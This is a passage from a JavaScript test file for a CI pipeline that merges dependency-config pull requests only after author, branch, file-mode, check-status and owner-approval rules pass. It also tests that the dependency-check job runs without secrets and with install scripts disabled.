    assert.equal(go({ modes: modesOf(['package.json', 'package-lock.json'], mode) }).ship, false, String(mode));
  }
  const half = modesOf(['package.json', 'package-lock.json']);
  half.base['package.json'] = '120000';
  assert.match(go({ modes: half }).reason, /was not a plain file before/);
  assert.match(go({ modes: null }).reason, /file modes could not be read/);
  assert.match(go({ modes: { head: {}, base: {} } }).reason, /symlink|plain file/);
});

test('the shared rules hold for a config pull request: actor, author, draft, fork, conflict, head, pushers, checks', () => {
  const refused = [
    [{ author: { login: 'a-contributor' } }, /author/], [{ isDraft: true }, /draft/], [{ isCrossRepository: true }, /fork/], [{ mergeable: 'CONFLICTING' }, /cleanly/],
    [{ headRefOid: 'b'.repeat(40) }, /moved/], [{ baseRefName: 'main' }, /into testing/], [{ state: 'CLOSED' }, /not open/], [{ headRefName: 'claude/fix-1-x' }, /neither/], [{ headRefName: 'feature/x' }, /neither/]
  ];
  for (const [over, why] of refused) {
    const out = go({ over });
    assert.equal(out.ship, false, JSON.stringify(over));
    assert.match(out.reason, why);
  }
  assert.match(go({ pushers: ['omniya-bot', 'a-contributor'] }).reason, /pushed to the branch/);
  assert.match(go({ missing: ['e2e'] }).reason, /not green on that commit: e2e/);
  assert.match(go({ extra: { pushCount: 100 } }).reason, /too many pushes/);
  assert.match(go({ over: { changedFiles: 9 } }).reason, /not complete/);
  assert.equal(decideConfig({ files: cfg(), modes: modesOf(['package.json', 'package-lock.json']), missing: [], number: 130, ownerSaid: 'ship 130', says: true, deps: PASS }).ship, true);
});

test('the contributor hand-off keeps refusing these files, and a lock change for the list is a lock change', () => {
  for (const file of ['package.json', 'package-lock.json', 'electron-builder.yml']) {
    const out = handOff({ fixBranch: true, filesComplete: true, mergeable: 'MERGEABLE', body: 'Fixes #1', missing: [], files: [{ filename: 'src/a.js', status: 'modified', additions: 3, deletions: 0 }, { filename: file, status: 'modified', additions: 1, deletions: 1 }] });
    assert.equal(out.action, 'protected', file);
  }
  const lock = JSON.parse(readFileSync('scripts/ci/zones.json', 'utf8')).lock;
  for (const f of ['scripts/ci/deps-gate.mjs', 'scripts/ci/deps-checks.mjs', 'scripts/ci/deps-summary.mjs', 'scripts/ci/install-script-allowlist.json', 'test/unit/pipeline/deps-gate.test.js']) assert.ok(lock.includes(f), `${f} must be in the lock`);
});

// ---------------------------------------------------------------- the shipper end to end, with a stand-in for gh

function fakeGh({ files, pushes = ['omniya-bot'], mode = '100644', view = prOf({ changedFiles: files.length }) } = {}) {
  const calls = [];
  const run = (args) => {
    calls.push(args);
    if (args[0] === 'pr' && args[1] === 'view') return JSON.stringify(view);
    if (args[0] === 'api' && args.some((a) => a.endsWith('/activity'))) return JSON.stringify(pushes.map((a) => ({ a })));
    if (args[0] === 'api' && args[1].endsWith('/files')) return files.map((f) => JSON.stringify(f)).join('\n');
    if (args[0] === 'api' && args.some((a) => a.includes('/compare/'))) return `${'b'.repeat(40)}\n`;
    if (args[0] === 'api' && args.some((a) => /\/git\/commits\//.test(a))) return 'treesha\n';
    if (args[0] === 'api' && args.some((a) => /\/git\/trees\//.test(a))) return JSON.stringify({ truncated: false, entries: files.map((f) => ({ path: f.filename, mode })) });
    if (args.some((a) => a.endsWith('/actions/runs'))) return JSON.stringify([{ id: 11, path: '.github/workflows/pr-checks.yml', created_at: 't', conclusion: 'success' }, { id: 12, path: '.github/workflows/pr-build.yml', created_at: 't', conclusion: 'success' }]);
    if (args.some((a) => /\/actions\/runs\/1[12]\/jobs$/.test(a))) return JSON.stringify((args.some((a) => a.includes('/runs/11/')) ? ['unit', 'nemeth', 'e2e'] : ['pack-mac', 'pack-win']).map((name) => ({ name, conclusion: 'success' })));
    return '';
  };
  return { run, calls };
}
const shipInput = { pr: 130, sha: SHA, repo: 'o/r', allowedAuthors, mergeToken: 't', ownerSaid: 'ship it 130', differential: 'same', deps: PASS };

test('ship(): a config pull request merges only with a pass and the owner\'s words; every refusal leaves it unmerged', () => {
  const files = cfg();
  const merged = (f) => f.calls.some((c) => c[0] === 'pr' && c[1] === 'merge');
  const f1 = fakeGh({ files });
  const out = ship(shipInput, f1.run, () => {});
  assert.deepEqual([out.shipped, out.tier], [true, 'config']);
  assert.ok(merged(f1));
  assert.ok(f1.calls.some((c) => c.includes('context=contributor-tested')));
  for (const over of [{ deps: { result: 'fail', summary: 'Not safe to ship: x.' } }, { deps: { result: 'error', summary: '' } }, { deps: undefined }, { ownerSaid: '' }, { ownerSaid: 'ship it 99' }, { ownerSaid: "don't ship it 130" }]) {
    const f = fakeGh({ files });
    const r = ship({ ...shipInput, ...over, deps: 'deps' in over ? over.deps ?? { result: 'not-run', summary: '' } : shipInput.deps }, f.run, () => {});
    assert.equal(r.shipped, false, JSON.stringify(over));
    assert.equal(merged(f), false, JSON.stringify(over));
    assert.ok(!f.calls.some((c) => c.includes('context=contributor-tested')), 'no lock status is set on a refusal');
  }
  const mixed = fakeGh({ files: [...files, { filename: 'src/a.js', status: 'modified', additions: 1, deletions: 0 }] });
  assert.match(ship(shipInput, mixed.run, () => {}).reason, /not one of the config files/);
  assert.equal(merged(mixed), false);
  const link = fakeGh({ files, mode: '120000' });
  assert.match(ship(shipInput, link.run, () => {}).reason, /symlink/);
  const stranger = fakeGh({ files, pushes: ['omniya-bot', 'a-contributor'] });
  assert.match(ship(shipInput, stranger.run, () => {}).reason, /pushed to the branch/);
  const contributor = fakeGh({ files, view: prOf({ changedFiles: 2, author: { login: 'a-contributor' } }) });
  assert.match(ship(shipInput, contributor.run, () => {}).reason, /author/);
});

test('the workflow runs the checks in a job with no secret and no environment, and the shipper reads only its output', async () => {
  const { load } = await import('js-yaml');
  const wf = load(readFileSync('.github/workflows/pipeline-ship.yml', 'utf8'));
  const job = wf.jobs.deps;
  assert.equal(job.environment, undefined);
  assert.deepEqual(job.permissions, { contents: 'read' });
  assert.doesNotMatch(JSON.stringify(job), /secrets\.|app-token|MERGE_TOKEN|permission-/);
  const checkout = job.steps.find((s) => typeof s.uses === 'string' && s.uses.startsWith('actions/checkout'));
  assert.equal(checkout.with['persist-credentials'], false);
  assert.equal(checkout.with.ref, 'testing');
  assert.match(job.steps.find((s) => s.id === 'check').run, /deps-gate\.mjs check "\$SHA"/);
  assert.match(job.steps.find((s) => (s.run ?? '').includes('npm ci')).run, /--ignore-scripts/);
  const env = wf.jobs.ship.steps.find((s) => (s.run ?? '').includes('ship-pipeline-pr.mjs')).env;
  assert.equal(env.DEPS_RESULT, '${{ needs.deps.outputs.result }}');
  assert.equal(env.DEPS_SUMMARY, '${{ needs.deps.outputs.summary }}');
  assert.ok(wf.jobs.ship.needs.includes('deps'));
  // The checks never run npm in the job that holds the secrets.
  assert.deepEqual(wf.jobs.ship.steps.map((s) => s.run ?? '').filter((r) => /npm (install|audit|run)/.test(r)), []);
});
